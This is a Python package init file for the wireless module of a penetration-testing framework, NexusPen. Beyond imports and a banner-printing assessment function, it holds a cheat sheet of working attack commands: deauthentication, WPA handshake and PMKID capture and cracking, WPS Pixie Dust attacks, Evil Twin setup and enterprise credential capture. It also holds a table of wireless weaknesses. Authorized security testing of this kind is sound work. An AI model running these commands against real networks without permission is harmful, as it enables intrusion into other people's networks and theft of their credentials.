"""
NexusPen - Wireless Module
===========================
Complete wireless penetration testing module.

Includes:
- scanner: WiFi network scanning and detection
- attacks: WPA/WPA2, WPS, WEP, Evil Twin attacks
- bluetooth: Bluetooth and BLE attacks
- tools: Integration with wireless security tools
"""

# Scanner
from .scanner import (
    WirelessScanner,
    AccessPoint,
    WirelessClient,
)

# WiFi Attacks
from .attacks import (
    WPAAttacks,
    PMKIDAttack,
    WEPAttacks,
    WPSAttacks,
    EvilTwin,
    EnterpriseAttacks,
    CapturedHandshake,
    CrackedPassword,
)

# Bluetooth
from .bluetooth import (
    BluetoothScanner,
    BluetoothDevice,
    BluetoothAttacks,
    BLEAttacks,
    MouseJack,
    WiFiPineapple,
)

# Tools Integration
from .tools import (
    Aircrack,
    Wifite,
    Bettercap,
    Kismet,
    Hashcat,
    Fern,
    WiFiAutomation,
)

__all__ = [
    # Scanner
    'WirelessScanner', 'AccessPoint', 'WirelessClient',
    
    # WiFi Attacks
    'WPAAttacks', 'PMKIDAttack', 'WEPAttacks', 'WPSAttacks',
    'EvilTwin', 'EnterpriseAttacks',
    'CapturedHandshake', 'CrackedPassword',
    
    # Bluetooth
    'BluetoothScanner', 'BluetoothDevice',
    'BluetoothAttacks', 'BLEAttacks',
    'MouseJack', 'WiFiPineapple',
    
    # Tools
    'Aircrack', 'Wifite', 'Bettercap', 'Kismet',
    'Hashcat', 'Fern', 'WiFiAutomation',
]


def run_full_assessment(interface: str = 'wlan0') -> dict:
    """
    Run comprehensive wireless security assessment.
    
    Args:
        interface: Wireless interface to use
    """
    from rich.console import Console
    console = Console()
    
    console.print("\n[bold red]═══════════════════════════════════════════════════════════[/bold red]")
    console.print("[bold red]              WIRELESS SECURITY ASSESSMENT                  [/bold red]")
    console.print("[bold red]═══════════════════════════════════════════════════════════[/bold red]")
    console.print(f"[cyan]Interface: {interface}[/cyan]")
    
    results = {
        'networks': [],
        'clients': [],
        'vulnerabilities': [],
        'handshakes': [],
        'bluetooth': [],
    }
    
    # 1. Initialize scanner
    console.print("\n[cyan]━━━ Phase 1: Network Scanning ━━━[/cyan]")
    try:
        scanner = WirelessScanner(interface)
        # Note: Actual scanning requires root and monitor mode
        console.print("[yellow]Note: Run with root privileges and monitor mode enabled[/yellow]")
    except Exception as e:
        console.print(f"[red]Scanner error: {e}[/red]")
    
    # 2. Attack preparation
    console.print("\n[cyan]━━━ Phase 2: Attack Preparation ━━━[/cyan]")
    console.print("[dim]Available attacks:[/dim]")
    console.print("  - WPA/WPA2 handshake capture + cracking")
    console.print("  - PMKID capture (clientless)")
    console.print("  - WPS PIN attacks (Reaver/Bully)")
    console.print("  - Evil Twin / Karma attacks")
    console.print("  - WPA-Enterprise credential capture")
    
    # 3. Bluetooth scanning
    console.print("\n[cyan]━━━ Phase 3: Bluetooth Scanning ━━━[/cyan]")
    try:
        bt_scanner = BluetoothScanner()
        console.print("[dim]Bluetooth scanning available[/dim]")
    except Exception as e:
        console.print(f"[dim]Bluetooth: {e}[/dim]")
    
    # Summary
    console.print("\n[bold cyan]═══ ASSESSMENT SUMMARY ═══[/bold cyan]")
    console.print(f"[cyan]Networks Found: {len(results['networks'])}[/cyan]")
    console.print(f"[cyan]Clients Found: {len(results['clients'])}[/cyan]")
    console.print(f"[cyan]Handshakes Captured: {len(results['handshakes'])}[/cyan]")
    
    return results


# Attack Cheat Sheet
WIRELESS_CHEATSHEET = '''
# Wireless Pentesting Cheat Sheet

## Monitor Mode
airmon-ng check kill
airmon-ng start wlan0

## Scanning
airodump-ng wlan0mon
wash -i wlan0mon  # WPS

## WPA/WPA2 Attack
# 1. Capture handshake
airodump-ng -c [CH] --bssid [BSSID] -w capture wlan0mon
aireplay-ng -0 5 -a [BSSID] wlan0mon

# 2. Crack
aircrack-ng -w wordlist.txt capture-01.cap
hashcat -m 22000 hashes.hc22000 wordlist.txt

## PMKID Attack (Clientless)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 wordlist.txt

## WPS Attack
reaver -i wlan0mon -b [BSSID] -c [CH] -vv
reaver -i wlan0mon -b [BSSID] -c [CH] -K 1  # Pixie Dust

## Evil Twin
hostapd evil.conf
dnsmasq -C dns.conf
# OR
wifiphisher

## Enterprise
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Check /var/log/hostapd-wpe.log

## Bluetooth
hcitool scan
sdptool browse [MAC]
btlejack -c [MAC]
'''


# Vulnerability reference
WIRELESS_VULNERABILITIES = {
    'WEP': {
        'severity': 'critical',
        'description': 'Weak encryption, easily cracked',
        'attack': 'ARP replay, PTW attack',
    },
    'WPA-Personal-Weak': {
        'severity': 'high',
        'description': 'Weak PSK vulnerable to dictionary attack',
        'attack': 'Handshake capture + crack',
    },
    'WPS-Enabled': {
        'severity': 'high',
        'description': 'WPS PIN brute force',
        'attack': 'Reaver/Bully PIN attack',
    },
    'WPS-Pixie-Dust': {
        'severity': 'critical',
        'description': 'Offline WPS PIN recovery',
        'attack': 'Pixie Dust attack',
    },
    'PMKID': {
        'severity': 'medium',
        'description': 'PMKID can be captured without client',
        'attack': 'hcxdumptool + hashcat',
    },
    'Hidden-SSID': {
        'severity': 'info',
        'description': 'Hidden SSID provides no security',
        'attack': 'Deauth reveals SSID',
    },
    'MAC-Filtering': {
        'severity': 'info',
        'description': 'MAC filtering easily bypassed',
        'attack': 'MAC spoofing',
    },
    'WPA-Enterprise-LEAP': {
        'severity': 'high',
        'description': 'LEAP uses MS-CHAPv2',
        'attack': 'hostapd-wpe credential capture',
    },
    'Bluetooth-Discoverable': {
        'severity': 'low',
        'description': 'Device always discoverable',
        'attack': 'Enumeration, potential attacks',
    },
    'BLE-Legacy-Pairing': {
        'severity': 'high',
        'description': 'Legacy pairing can be cracked',
        'attack': 'crackle attack',
    },
}
